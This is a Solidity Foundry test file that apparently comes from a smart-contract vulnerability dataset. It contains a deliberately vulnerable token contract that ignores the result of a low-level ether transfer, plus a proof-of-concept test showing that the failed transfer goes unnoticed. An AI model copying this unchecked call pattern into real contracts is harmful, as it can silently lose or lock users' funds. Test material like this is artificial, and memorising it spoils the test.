pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract Rejecter {
    fallback() external payable {
        revert("Rejecter fallback revert");
    }
}

contract daoPOLSKAtokens {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    address public owner;
    address public migrationMaster;

    constructor() {
        name = "daoPOLSKAtokens";
        symbol = "DPT";
        owner = msg.sender;
        migrationMaster = address(0);
    }

    // Vulnerable function: sends all ether balance to owner via low-level call without checking success
    function PartialFundsTransfer(uint256) external {
        // Send all ether balance to owner, unchecked call
        (bool success, ) = owner.call{value: address(this).balance}("");
        // success is ignored, vulnerability here
    }

    // Allow contract to receive ether
    receive() external payable {}
}

contract daoPOLSKAtokensTest is Test {
    daoPOLSKAtokens token;
    Rejecter rejecter;

    function setUp() public {
        token = new daoPOLSKAtokens();
        // Fund the token contract with some ether so it has balance for FundsTransfer
        vm.deal(address(this), 2 ether);
        payable(address(token)).transfer(1 ether);
    }

    receive() external payable {}

    function test_exploit_unchecked_low_level_calls() public {
        // Deploy Rejecter contract whose fallback reverts
        rejecter = new Rejecter();

        // Fund the token contract with some ether so it has balance to send
        (bool sent, ) = address(token).call{value: 1 ether}("");
        assertTrue(sent, "Funding token contract failed");

        // owner is originally this contract (daoPOLSKAtokensTest)
        // We overwrite token.owner storage slot to rejecter address to simulate attacker as owner
        // owner is at slot 2:
        // slot 0: name (string, dynamic)
        // slot 1: symbol (string, dynamic)
        // slot 2: owner (address)
        vm.store(address(token), bytes32(uint256(2)), bytes32(uint256(uint160(address(rejecter)))));

        // Record balances before call
        uint256 tokenBalanceBefore = address(token).balance;
        uint256 rejecterBalanceBefore = address(rejecter).balance;

        // Impersonate rejecter (now owner) to call PartialFundsTransfer
        vm.prank(address(rejecter));
        token.PartialFundsTransfer(0);

        // The call to owner.call{value: ...} will fail because Rejecter fallback reverts
        // But PartialFundsTransfer does not check success, so token call returns normally

        // Assert that token contract balance is unchanged (still has funds)
        assertEq(address(token).balance, tokenBalanceBefore);

        // Assert that owner (rejecter) balance did NOT increase (fallback reverted)
        assertEq(address(rejecter).balance, rejecterBalanceBefore);

        // Assert that the transaction did not revert and completed successfully
        // This confirms unchecked low-level call vulnerability exploited
        assertTrue(true, "Unchecked low level call exploit succeeded");
    }
}

